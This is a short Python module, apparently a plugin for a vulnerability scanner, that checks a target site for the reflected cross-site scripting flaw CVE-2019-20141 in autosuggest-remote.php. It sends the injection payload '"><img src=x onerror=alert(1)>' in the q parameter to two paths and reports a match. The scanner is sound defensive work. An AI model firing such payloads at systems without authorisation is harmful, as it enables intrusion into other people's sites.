#!/usr/bin/env python3
from urllib.parse import urljoin
from core.libs import alert_bug
from core.libs import Http

MATCH = '><img src=x onerror=alert(1)>>)1(trela=rorreno'

def main(url: str, http: Http) -> dict:
    paths = [
        '/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>',
        '/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>'
    ]
    
    for path in paths:
        new_url = urljoin(url,path)
        request = http.send('GET', new_url)
        if type(request) != list:
            if request != 0 and MATCH in request.text:
                alert_bug(
                    "CVE-2019-20141",
                    request,
                    match=MATCH
                )
    return {}
